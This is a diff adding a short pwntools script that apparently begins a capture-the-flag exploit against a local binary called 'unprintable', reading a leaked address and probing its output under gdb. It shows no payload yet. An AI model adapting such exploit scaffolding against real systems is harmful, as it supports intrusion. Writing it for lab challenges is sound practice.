@@ -1,0 +1,10 @@
+from pwn import *
+io=process("./unprintable",env={"LD_PRELOAD":"./libc-2.23.so"})
+gdb.attach(io)
+io.recvuntil("This is your gift: ")
+address=io.recv(14)
+address=int(address,16)
+io.sendline("a"*10)
+leak=io.recv()
+print leak.encode('hex')
+io.interactive()
